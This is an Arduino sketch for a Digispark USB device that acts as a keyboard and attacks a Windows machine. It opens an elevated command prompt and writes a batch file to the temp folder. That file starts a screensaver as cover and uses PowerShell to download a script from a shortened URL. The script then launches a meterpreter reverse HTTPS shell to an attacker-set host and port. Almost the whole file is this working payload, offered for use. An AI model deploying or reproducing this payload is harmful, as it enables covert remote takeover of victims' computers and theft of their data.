#include "DigiKeyboard.h"
// This script is designed for use on Windows machines with QWERTY as a keyboard layout
// As DigiKeyboard Library does not support AZERTY text yet in print(), you have to use the "az_qw_convert.sh" script to convert AZERTY to QWERTY layout.
// For more scripts checkout: https://git.io/vAGf4
// Developer: NBN | 02/13/2018 @19:00 UTC
void setup() {
  // Initialize the digital pin as an output.
  pinMode(1, OUTPUT); //LED on Model A
}
void cmd_1() {
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("c;d");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void cmd_2() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell  Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
// Infinite loop
void loop() {

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); // LED on <--> Action start
  cmd_1(); // Open CMD in Administrator Privileges using METHOD 1 (UNCOMMENT TO USE)
  //cmd_2(); // Open CMD in Administrator Privileges using METHOD 2 (UNCOMMENT TO USE)
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.delay(250);
  DigiKeyboard.println("cd %TEMP%"); // Change to temp directory
  DigiKeyboard.delay(250);
  DigiKeyboard.println("copy con tmp.cmd"); // Create the file tmp.cmd
  DigiKeyboard.delay(500);
  DigiKeyboard.println("start C:/Windows/System32/Ribbons.scr /s");
  DigiKeyboard.delay(250);
  DigiKeyboard.println("powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <IP_ADDRESS> -Lport <PORT> -Force""); // Edit both Lhost and Lport according to your setup
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT); // Save the file and return to cmd shell use delay of 500ms
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("tmp.cmd && exit"); // Start the payload file and exit (DANGEROUS/OFFENSIVE STEP! Please comment this line if you want to test inoffensively on your own PC)
  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*Infinite loop to disconnect device*/ }
}
